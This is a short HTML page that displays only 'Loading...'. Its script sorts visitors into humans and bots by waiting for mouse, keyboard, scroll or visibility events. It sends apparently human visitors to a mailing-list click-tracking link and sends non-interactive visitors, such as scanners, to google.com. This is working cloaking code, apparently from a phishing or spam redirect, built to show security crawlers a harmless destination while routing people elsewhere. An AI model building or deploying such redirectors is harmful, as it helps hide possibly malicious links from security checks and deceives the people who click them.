<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Insight</title>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const isHuman = () => {
        return new Promise((resolve) => {
          let interacted = false; 

          const events = ["mousemove", "keydown", "click", "scroll", "focus"];
          const interactionListener = () => {
            interacted = true;
            resolve(true);
            events.forEach((event) => window.removeEventListener(event, interactionListener));
          };

          events.forEach((event) => window.addEventListener(event, interactionListener));

          // Fallback to check page visibility
          const checkVisibility = () => {
            if (document.visibilityState === "visible") {
              resolve(true);
            }
          };
          document.addEventListener("visibilitychange", checkVisibility);

          // Default timeout for no interaction
          setTimeout(() => {
            if (!interacted) resolve(false);
          }, 10000); // 10 seconds
        });
      };

      isHuman().then((human) => {
        if (human) {
          // Redirect human users to the main page
          window.location.href = "https://semi-zcmp.maillist-manage.com/click/1134d1b69885462df/1134d1b6988545f27";
        } else {
          // Redirect bots or non-interactive visitors to another URL
          window.location.href = "https://google.com";
        }
      });
    });
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
